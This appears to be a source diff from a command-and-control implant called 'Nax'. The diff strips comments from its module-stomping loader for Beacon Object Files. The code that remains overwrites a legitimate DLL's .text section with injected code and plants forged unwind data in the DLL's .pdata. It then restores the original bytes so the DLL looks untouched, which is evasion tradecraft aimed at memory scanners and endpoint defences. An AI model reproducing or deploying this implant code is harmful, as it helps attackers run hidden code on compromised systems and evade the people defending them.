@@ -54,14 +54,10 @@ static BOOL StompInitSlot( PNAX_INSTANCE Nax, PWCHAR dllName, BOF_STOMP_SLOT* sl
                 slot->TextCap = sec[i].Misc.VirtualSize;
             slot->InUse = FALSE;
 
-            /* Back up original .text so the DLL looks untouched between executions */
             slot->TextBackup = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, slot->TextCap );
             if ( slot->TextBackup )
                 MmCopy( slot->TextBackup, slot->TextBase, slot->TextCap );
 
-            /* Cache .pdata location and back up original content.
-             * .pdata is zeroed per-execution so dynamic RtlAddFunctionTable
-             * entries take priority, then restored when the BOF finishes. */
             PIMAGE_DATA_DIRECTORY exDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
             if ( exDir->VirtualAddress && exDir->Size ) {
                 slot->PdataBase = (PVOID)( (PBYTE)hDll + exDir->VirtualAddress );
@@ -86,8 +82,6 @@ static BOOL StompInitSlot( PNAX_INSTANCE Nax, PWCHAR dllName, BOF_STOMP_SLOT* sl
 
 /* ========= [ near allocator ] ========= */
 
-/* Allocate 'need' bytes within ±16 MB of the stomp DLL image.
- * Keeps REL32 displacements from .text well within ±2 GB. */
 static PVOID StompAllocNear( PNAX_INSTANCE Nax, BOF_STOMP_SLOT* slot, SIZE_T need, ULONG protect ) {
     ULONG_PTR dll_end  = (ULONG_PTR)slot->DllBase + slot->Nt->OptionalHeader.SizeOfImage;
     ULONG_PTR fwd_base = ( dll_end + 0xFFFF ) & ~(ULONG_PTR)0xFFFF;
@@ -156,7 +150,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
     if ( !Nax->Config.BofStomp || !Nax->BofStompPool.Initialized )
         return FALSE;
 
-    /* Find the .text section index in the COFF */
     INT textIdx = -1;
     UINT32 textNeed = 0;
     for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
@@ -173,7 +166,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
     if ( textIdx < 0 || textNeed == 0 )
         return FALSE;
 
-    /* Pick a slot: SmSlot (resident BOF), sync (no job on this thread), or async */
     NAX_JOB* curJob = NaxFindCurrentJob( Nax );
     BOF_STOMP_SLOT* slot = NULL;
     BYTE slotIdx = 0xFF;
@@ -206,7 +198,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
         return FALSE;
     }
 
-    /* Stomp .text into DLL's .text section */
     DWORD old = 0;
     if ( !Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_READWRITE, &old ) ) {
         NaxDbg( Nax, "[bof-stomp] VirtualProtect RW failed" );
@@ -253,7 +244,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
             MmCopy( base, bof + s->PointerToRawData, raw_size );
     }
 
-    /* Allocate mapFunctions near the DLL */
     PVOID mf = StompAllocNear( Nax, slot, 4096, PAGE_READWRITE );
     if ( !mf ) {
         NaxDbg( Nax, "[bof-stomp] mapFunctions near-alloc failed" );
@@ -275,7 +265,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
     MmZero( mf, 4096 );
     *mf_out = mf;
 
-    /* Zero .pdata so dynamic RtlAddFunctionTable entries take priority */
     if ( slot->PdataBase && slot->PdataSize ) {
         DWORD pdOld = 0;
         Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );
@@ -292,8 +281,6 @@ FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
     return TRUE;
 }
 
-/* Called after relocations to set final protections:
- * .text in DLL -> PAGE_EXECUTE_READ; private sections stay PAGE_READWRITE. */
 FUNC VOID NaxBofStompProtect( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSections,
                                PCOF_SECTION sections ) {
     NAX_JOB* curJob = NaxFindCurrentJob( Nax );
@@ -314,16 +301,6 @@ FUNC VOID NaxBofStompProtect( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numS
 
 /* ========= [ inject .pdata into DLL ] ========= */
 
-/* Write the BOF's relocated RUNTIME_FUNCTION entries directly into the DLL's
- * .pdata section and copy the corresponding xdata (UNWIND_INFO) into the tail
- * of the DLL's .text section.  The IFT already covers .pdata, so the unwinder
- * finds our entries without RtlAddFunctionTable.
- *
- * xdata is placed at the END of .text (after the BOF code).  This keeps
- * UnwindData RVAs within the DLL image even when the near-allocator placed the
- * original xdata section before DllBase.
- *
- * Caller must invoke this while .text is still PAGE_READWRITE. */
 FUNC BOOL NaxBofStompPdata( PNAX_INSTANCE Nax, PRUNTIME_FUNCTION src, DWORD srcCount,
                              ULONG_PTR image_base, PVOID xdataBase, ULONG xdataSize ) {
     NAX_JOB* curJob = NaxFindCurrentJob( Nax );
@@ -341,8 +318,6 @@ FUNC BOOL NaxBofStompPdata( PNAX_INSTANCE Nax, PRUNTIME_FUNCTION src, DWORD srcC
     if ( !xdataBase || xdataSize == 0 )
         return FALSE;
 
-    /* Place xdata copy at the tail of the DLL's .text (4-byte aligned).
-     * Typical .text is several MB, xdata is a few hundred bytes. */
     ULONG xdataAligned = ( xdataSize + 3 ) & ~3u;
     if ( xdataAligned > slot->TextCap )
         return FALSE;
@@ -362,15 +337,12 @@ FUNC BOOL NaxBofStompPdata( PNAX_INSTANCE Nax, PRUNTIME_FUNCTION src, DWORD srcC
     DWORD pdOld = 0;
     Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );
 
-    /* BeginAddress/EndAddress: .text is within the DLL, so ULONG wrapping on
-     * (image_base - DllBase) produces correct RVAs even when image_base < DllBase. */
     ULONG adj = (ULONG)( image_base - (ULONG_PTR)slot->DllBase );
 
     for ( DWORD i = 0; i < srcCount; i++ ) {
         dst[ startIdx + i ].BeginAddress = src[i].BeginAddress + adj;
         dst[ startIdx + i ].EndAddress   = src[i].EndAddress   + adj;
 
-        /* UnwindData: recompute to point at the xdata copy in .text. */
         ULONG_PTR origVA      = image_base + src[i].UnwindData;
         ULONG_PTR internalOff = origVA - (ULONG_PTR)xdataBase;
         dst[ startIdx + i ].UnwindData = (ULONG)( (ULONG_PTR)xdataDst + internalOff
@@ -398,7 +370,6 @@ FUNC VOID NaxBofStompFree( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSect
 
     if ( !slot || !slot->InUse ) return;
 
-    /* Restore original DLL .text content */
     DWORD old = 0;
     Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_READWRITE, &old );
     if ( slot->TextBackup )
@@ -407,7 +378,6 @@ FUNC VOID NaxBofStompFree( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSect
         MmZero( slot->TextBase, slot->TextCap );
     Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &old );
 
-    /* Restore original .pdata content */
     if ( slot->PdataBase && slot->PdataSize && slot->PdataBackup ) {
         DWORD pdOld = 0;
         Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );
@@ -415,7 +385,6 @@ FUNC VOID NaxBofStompFree( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSect
         Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, pdOld, &pdOld );
     }
 
-    /* Free private sections (non-.text) */
     for ( UINT16 i = 0; i < numSections && i < BOF_MAX_SECTIONS; i++ ) {
         if ( mapSections[i] && mapSections[i] != slot->TextBase ) {
             PVOID  base = mapSections[i];
